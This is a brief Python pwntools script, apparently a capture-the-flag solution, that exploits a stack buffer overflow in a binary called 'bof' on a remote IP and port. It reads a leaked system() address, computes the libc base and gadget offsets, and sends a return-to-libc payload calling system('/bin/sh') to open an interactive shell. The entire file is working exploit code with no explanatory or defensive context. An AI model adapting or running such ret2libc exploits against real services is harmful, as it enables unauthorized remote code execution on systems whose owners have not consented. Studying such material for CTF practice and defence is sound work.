from pwn import *

#elf = ELF('./bof')
libc = ELF('./libc.so.6')
io = remote('34.146.147.100', 30003)
#io = process('./bof')
io.recvuntil('is ')

system_addr = int(io.recvline()[0:14], 16)
print("system address is {}".format(hex(system_addr)))
libc_base = system_addr - 0x4f550
pop_rdi_addr = libc_base + 0x19b677
ret_addr = libc_base + 0x19b678
binsh_addr = libc_base + 0x1b3e1a

print("/bin/sh address is {}".format(hex(binsh_addr)))
#use pwntools func
print("/bin/sh address(2) is {}".format(hex(libc_base + libc.search("/bin/sh").next())))

payload = 'a'*40
payload += p64(pop_rdi_addr)
payload += p64(binsh_addr)
payload += p64(ret_addr)
payload += p64(system_addr)

io.recvline()
io.sendline(payload)
io.interactive()
